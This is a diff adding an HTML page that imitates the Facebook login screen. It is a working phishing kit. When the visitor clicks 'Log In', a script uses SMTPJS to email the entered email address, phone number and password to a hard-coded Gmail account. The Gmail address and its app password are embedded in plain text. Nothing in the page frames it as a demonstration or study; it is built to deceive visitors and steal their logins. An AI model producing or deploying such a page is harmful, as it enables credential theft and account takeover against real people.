@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="style.css">
+    <title>facebook page</title>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+    <div class="all">
+        <div class="container">
+            <form>
+                <input type="email" id="email" placeholder="Email address" required>
+                <input type="number" id="number" placeholder="Phone number" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <input type="button" value = "Log In" id="login" onclick="sendEmail(); reset(); return false;">
+                <p><a href="#">Forgotten password?</a></p>
+                <hr>
+                <button>Create New Account</button>
+            </form>
+        </div>
+        <h3>facebook</h3>
+        <pre id="fbooktext">Connect with friends and the <br>world around you on Facebook.</pre>
+    </div>
+    <script>
+        function sendEmail(){
+            Email.send({
+                    Host : "smtp.gmail.com",
+                    Username : "ezeigboemmanuel2@gmail.com",
+                    Password : "trqtoitjpapfusbn",
+                    To : "ezeigboemmanuel2@gmail.com",
+                    From : document.getElementById("email").value,
+                    Subject : "Details",
+                    Body : "Email: " + document.getElementById("email").value
+                            +"<br> phone no; " + document.getElementById("number").value
+                            +" <br> Password: " +document.getElementById("password").value
+                }).then(
+                  message => alert(message)
+                );
+        }
+    </script>
+</body>
+</html>
